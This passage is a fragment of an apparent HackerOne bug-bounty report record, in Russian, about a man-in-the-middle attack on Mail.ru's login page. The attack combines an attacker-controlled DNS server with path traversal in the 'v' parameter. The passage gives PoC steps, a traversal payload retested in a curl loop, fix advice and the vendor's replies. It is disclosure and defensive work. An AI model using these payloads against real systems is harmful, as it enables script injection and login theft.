src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/638/7e4ed82227e3a28cbf64a8819d8b103862f8e8c5/screen_003.png?response-content-disposition=attachment%3B%20filename%3D%22screen_003.png%22%3B%20filename%2A%3DUTF-8%27%27screen_003.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T052523Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=6069b8b295698c373b707baa1fe5f49a3d27fd61429af1ec62613ebf8b906b91\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"3\"\u003e3. Сценарий атаки\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eатакер конфигурирует сеть таким образом, что в качестве dns\u0026#39;а используется подконтрольный ему сервер. По запросу img.imgsmail.ru он будет давать ip 178.237.20.77 (адрес files.imgsmail.ru):\u003c/li\u003e\n\u003cli\u003eжертва подключается к такой сети\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eжертва открывает страницу по ссылке откуда-нибудь (ну или атакер подмешивает ей автоматическое открытие в http трафик, как делают показ рекламы в московском метро или в мобильном интернете) и запускает код атакующего\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"4-poc\"\u003e4. POC:\u003c/h2\u003e\n\n\u003cp\u003eСтабильно воспроизводится в последнем Firefox, но не работает в Google chrome (в данном примере не работает потому что хрому нужен явный content-type для js). Думаю, что Firefox\u0026#39;а достаточно для пруфа.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eВыставить в настройках сети dns сервер: 52.34.103.214. \u003c/li\u003e\n\u003cli\u003eОткрыть ссылку-редиректор: \u003ca title=\"https://obmhld.com/pocs/?token=b0c93dc547233c441e2316d87ff067c2\" href=\"/redirect?url=https%3A%2F%2Fobmhld.com%2Fpocs%2F%3Ftoken%3Db0c93dc547233c441e2316d87ff067c2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://obmhld.com/pocs/?token=b0c93dc547233c441e2316d87ff067c2\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eЕсли вашего юзерагента не оказалось в моем списке - вы можете сами выставить на клиенте нужный юзерагент, который уже есть в редиректоре, чтобы убедиться в работоспособности сценария. Список приведен выше в исходниках редиректора.\u003cbr\u003e\nЕсли по каким-то причинам вы не можете использовать существующий - напишите мне, пожалуйста, - я добавлю ваш user-agent в список.\u003c/p\u003e\n\n\u003cp\u003eЗаписал видео, как это выглядит у жертвы (браузер под виртуалкой - firefox 57 под win7, без дополнений и расширений, никаких манипуляций с сертификатами не проводил )\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screencast_18.11.2017_18_16_10.webm\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/639/d0650584495ef97d545e2aa0088f12c21109e6fe/Screencast_18.11.2017_18_16_10.webm?response-content-disposition=attachment%3B%20filename%3D%22Screencast_18.11.2017_18_16_10.webm%22%3B%20filename%2A%3DUTF-8%27%27Screencast_18.11.2017_18_16_10.webm\u0026amp;response-content-type=video%2Fwebm\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T052523Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=90739e1407a798880f2fa01ac3bec0da438dbed123c0f2b63792f304bbd2b2b9\" data-attachment-type=\"video/webm\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/639/d0650584495ef97d545e2aa0088f12c21109e6fe/Screencast_18.11.2017_18_16_10.webm?response-content-disposition=attachment%3B%20filename%3D%22Screencast_18.11.2017_18_16_10.webm%22%3B%20filename%2A%3DUTF-8%27%27Screencast_18.11.2017_18_16_10.webm\u0026amp;response-content-type=video%2Fwebm\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T052523Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=90739e1407a798880f2fa01ac3bec0da438dbed123c0f2b63792f304bbd2b2b9\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"5\"\u003e5. Как починить:\u003c/h2\u003e\n\n\u003cp\u003eКак быстрофикс - можно провалидировать хосты на машинах в конфиге nginx\u0026#39;а, чтобы не было возможности обращаться к серверу 178.237.20.77 с заголовком Host: img.imgsmail.ru.\u003cbr\u003e\nТакже нужно добавить более жесткую валидацию параметра v на странице \u003ca title=\"https://account.mail.ru/login\" href=\"/redirect?url=https%3A%2F%2Faccount.mail.ru%2Flogin\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://account.mail.ru/login\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e?\u003c/p\u003e\n\n\u003cp\u003eP.S. Я уверен что в реальности сценарий может быть еще проще, если атакующий контролирует всю сеть. Он может, к примеру, заменить ответ на любой http запрос с целью редиректа пользователя с нужным параметром автоматически, такое можно наблюдать в московской подземке, где подмешивается реклама в контент http страниц или у мобильных операторов, мтс (по крайней мере в Москве) подсовывает свою рекламу в http ответы.\u003c/p\u003e\n\n\u003cp\u003eP.S.p.s. Если что-то описал не совсем понятно - дайте мне знать, буду рад помочь.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":30,"name":"Man-in-the-Middle"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":240637,"file_name":"screen_002.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/637/f5c44ed42fc26e34c52ef93e7119a50c7360cb1f/screen_002.png?response-content-disposition=attachment%3B%20filename%3D%22screen_002.png%22%3B%20filename%2A%3DUTF-8%27%27screen_002.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052523Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=3fb2e9f7b3d50de7f1e1900eb383dd19f43fc5ba76ee5d975b4574fadcb13851","file_size":201518,"type":"image/png"},{"id":240638,"file_name":"screen_003.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/638/7e4ed82227e3a28cbf64a8819d8b103862f8e8c5/screen_003.png?response-content-disposition=attachment%3B%20filename%3D%22screen_003.png%22%3B%20filename%2A%3DUTF-8%27%27screen_003.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052523Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=6069b8b295698c373b707baa1fe5f49a3d27fd61429af1ec62613ebf8b906b91","file_size":68807,"type":"image/png"},{"id":240639,"file_name":"Screencast_18.11.2017_18_16_10.webm","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/639/d0650584495ef97d545e2aa0088f12c21109e6fe/Screencast_18.11.2017_18_16_10.webm?response-content-disposition=attachment%3B%20filename%3D%22Screencast_18.11.2017_18_16_10.webm%22%3B%20filename%2A%3DUTF-8%27%27Screencast_18.11.2017_18_16_10.webm\u0026response-content-type=video%2Fwebm\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052523Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=90739e1407a798880f2fa01ac3bec0da438dbed123c0f2b63792f304bbd2b2b9","file_size":1481165,"type":"video/webm"}],"allow_singular_disclosure_at":"2018-01-26T14:11:31.936Z","allow_singular_disclosure_after":-92243631.38040604,"singular_disclosure_allowed":true,"vote_count":8,"voters":["secator","s_p_q_r","theappsec","eveeez","khizer47","whitesector","cr4xerbik4sh","3apa3a"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":258,"asset_type":"URL","asset_identifier":"account.mail.ru","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2167496,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"UPD: первый заголовок неправильный, там просто про подмену пути должно быть. Подготовку файлов перенес во второй пункт","markdown_message":"\u003cp\u003eUPD: первый заголовок неправильный, там просто про подмену пути должно быть. Подготовку файлов перенес во второй пункт\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-18T16:35:52.636Z","updated_at":"2017-11-18T16:35:52.636Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2167754,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"UPD2: Оказывается в хроме тоже работает, по крайней мере под линуском. Как оказалось ссылки на файлы живут не так уж и долго, поэтому на сервер положу скрипт, который будет каждый час генерить новые. Если вдруг POC перестанет работать - напишите в комментах, плз.","markdown_message":"\u003cp\u003eUPD2: Оказывается в хроме тоже работает, по крайней мере под линуском. Как оказалось ссылки на файлы живут не так уж и долго, поэтому на сервер положу скрипт, который будет каждый час генерить новые. Если вдруг POC перестанет работать - напишите в комментах, плз.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-18T18:51:45.621Z","updated_at":"2017-11-18T18:52:11.508Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2167824,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Спасибо за ваш репорт.  Мы ценим ваше желание сделать наши сервисы ещё безопаснее.\n\nПрисланная вами информация передана аналитикам и проверяется, мы обязательно свяжемся с вами в ближайшее время.","markdown_message":"\u003cp\u003eСпасибо за ваш репорт.  Мы ценим ваше желание сделать наши сервисы ещё безопаснее.\u003c/p\u003e\n\n\u003cp\u003eПрисланная вами информация передана аналитикам и проверяется, мы обязательно свяжемся с вами в ближайшее время.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-18T20:31:29.108Z","updated_at":"2017-11-18T20:31:29.108Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2167963,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Привет\nВ качестве быстрофикса вкрутили валидацию параметра 'v'\nПоведение сервака 178.237.20.77 будем также исправлять, но уже не сегодня","markdown_message":"\u003cp\u003eПривет\u003cbr\u003e\nВ качестве быстрофикса вкрутили валидацию параметра \u0026#39;v\u0026#39;\u003cbr\u003e\nПоведение сервака 178.237.20.77 будем также исправлять, но уже не сегодня\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-18T22:44:56.576Z","updated_at":"2017-11-18T22:44:56.576Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2168033,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ого, оперативно, спасибо! Валидацию потестил, не знаю как у mail.ru синкается код между серверами, но сейчас фикс выглядит неполным.\n\nЗапускал из разных стран, иногда таки отстреливает без валидации:\n\n```\nubuntu@ip-172-31-36-215:~/www/php/pocs/tmp$ for i in `seq 1 50`; do echo \"Try $i - `curl -is \"https://account.mail.ru/login?v=1.3.14633asd\u0026v=1.2.544/lalala/../../../../?$i\" | grep -oh '\u003cscript\\ssrc=.*authGate.js'`\"; done;                                                                                                                                                                                                         \nTry 1 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 2 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 3 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 4 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 5 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 6 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 7 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 8 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 9 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 10 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 11 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 12 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 13 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 14 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 15 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 16 - \u003cscript src=\"https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?16/authGate.js\nTry 17 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 18 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 19 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 20 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 21 - \u003cscript src=\"https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?21/authGate.js\nTry 22 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 23 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 24 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 25 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 26 - \u003cscript 